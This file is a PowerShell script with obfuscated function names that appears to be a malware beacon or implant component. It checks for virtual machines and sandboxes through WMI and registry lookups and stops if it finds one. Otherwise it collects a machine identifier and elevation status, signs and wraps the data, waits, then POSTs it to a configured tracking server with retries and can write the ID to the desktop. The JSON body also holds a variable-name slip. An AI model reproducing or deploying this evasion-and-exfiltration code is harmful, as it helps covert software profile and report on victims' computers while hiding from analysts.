. ./utils.ps1
. ./consts_body.ps1

function VhfYTsNEyTfXeJhKmVGYJ_f {
    # Get Win32_ComputerSystem information
    $LSnKUPDhYMQwyiotdJwoTs = Get-WmiObject -Class Win32_ComputerSystem
    $OmglpkVikRxWtzWgnrmR = $false

    # Check for common virtualization manufacturers
    $nyQKvBvkFxpjwSYTG = @(
        "Microsoft Corporation",   # Hyper-V
        "VMware, Inc.",            # VMware
        "Xen",                     # Xen
        "XenSource, Inc.",         # XenSource
        "innotek GmbH",            # VirtualBox
        "Oracle Corporation",      # VirtualBox
        "Parallels Software International Inc.", # Parallels
        "QEMU",                    # QEMU
        "Red Hat, Inc.",           # KVM
        "Amazon EC2",              # AWS EC2
        "Google",                  # Google Cloud Platform
        "Virtuozzo",               # Virtuozzo
        "DigitalOcean"             # DigitalOcean
    )

    # Check Manufacturer and Model for signs of virtualization
    if ($nyQKvBvkFxpjwSYTG -contains $LSnKUPDhYMQwyiotdJwoTs.Manufacturer) {
        $OmglpkVikRxWtzWgnrmR = $true
    } elseif ($LSnKUPDhYMQwyiotdJwoTs.Model -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $OmglpkVikRxWtzWgnrmR = $true
    }

    # Additional checks for virtualization using Win32_BIOS
    $mYwfmUNjjMGRUAsDtvwThi = Get-WmiObject -Class Win32_BIOS
    if ($mYwfmUNjjMGRUAsDtvwThi.SerialNumber -match "VMware|VBOX|Virtual|Xen|QEMU|Parallels") {
        $OmglpkVikRxWtzWgnrmR = $true
    }

    # Additional checks using Win32_ComputerSystemProduct
    $jzmIlUdndNABFbGzQYS = Get-WmiObject -Class Win32_ComputerSystemProduct
    if ($jzmIlUdndNABFbGzQYS.Version -match "Virtual|VM|VBOX|KVM|QEMU|Parallels|Xen") {
        $OmglpkVikRxWtzWgnrmR = $true
    }

    # Additional registry check for Parallels
    $ZOixxIIXiVFUdUEFtJGDx = "HKLM:\SOFTWARE\Parallels\Parallels Tools"
    if (Test-Path $ZOixxIIXiVFUdUEFtJGDx) {
        $OmglpkVikRxWtzWgnrmR = $true
    }

    return $OmglpkVikRxWtzWgnrmR
}

function TIOHZqwStJTWZXTtTYMC_f {
    param (
        [string]$data,
        [string]$key
    )

    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $keyBytes
    $hashBytes = $hmac.ComputeHash($dataBytes)
    
    return [Convert]::ToBase64String($hashBytes)
}

function hXKQlOpvUKQyoVEpKQrAMR_f {
    param (
        [string]$FileName,
        [string]$Content
    )
    
    # Get the path to the desktop
    $DesktopPath = [System.Environment]::GetFolderPath('Desktop')
    
    # Create the full path to the file
    $FilePath = Join-Path -Path $DesktopPath -ChildPath $FileName
    
    # Write the content to the file, creating or overwriting it
    Set-Content -Path $FilePath -Value $Content
}

function qOrvrlJIrPZOQyXhkx_f()
{
    return RegReadParam -keyName "trackSerie"
}


function mGOqdCPvYKqRXoUqEo_f {
    if ($server.track -eq $false){
        return
    }

    $isVM = VhfYTsNEyTfXeJhKmVGYJ_f
    if ($isVM -eq $true){
        return
    }

    $elevated = 0
    if (IsElevated)
    {
        $elevated=1;
    }

    $id = Get-MachineCode
    $serie=qOrvrlJIrPZOQyXhkx_f

    $body = "{`"id`":`"$($id.ToString())`",`"serie`":`"$qOrvrlJIrPZOQyXhkx_f`",`"elevated_number`":$($elevated)}"

    # Secret key (shared with the server)
    $secretKey = "YourSecretKeyHere"

    $url= $server.trackUrl
  
    # Generate the hash for the JSON request body
    $hash = TIOHZqwStJTWZXTtTYMC_f -data $body -key $secretKey

    # Prepare headers
    $headers = @{
        "X-Signature" = $hash
        "Content-Type" = "application/json"
        "User-Agent"  = "PowerShell/7.2"  # Use the User-Agent from Postman if known
    }

    $url = SmartServerlUrl -url $url
    $body = EnvelopeIt -inputString $body

    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 30
    if (-not $globalDebug)
    {
        Start-Sleep -Seconds $delay
    }

    
    while ([datetime]::UtcNow -lt $timeout) 
    {
     
        try {
                Invoke-WebRequest -Headers $headers -Method "POST" -Body $body -Uri $url -ContentType "application/json; charset=utf-8"
                break;
            }
            catch [System.Net.WebException] {
                $statusCode = $_.Exception.Response.StatusCode
                $respStream = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($respStream)
                $reader.BaseStream.Position = 0
                $responseBody = $reader.ReadToEnd() | ConvertFrom-Json
                    writedbg "Error making request: $responseBody"
            
            }
            catch{
                    writedbg "Error making request: $_"
            }

            Start-Sleep -Seconds $delay
    }

    if ($server.trackDesktop -eq $true){
        hXKQlOpvUKQyoVEpKQrAMR_f -FileName "$($server.trackSerie).txt" -Content $id
    }

}

mGOqdCPvYKqRXoUqEo_f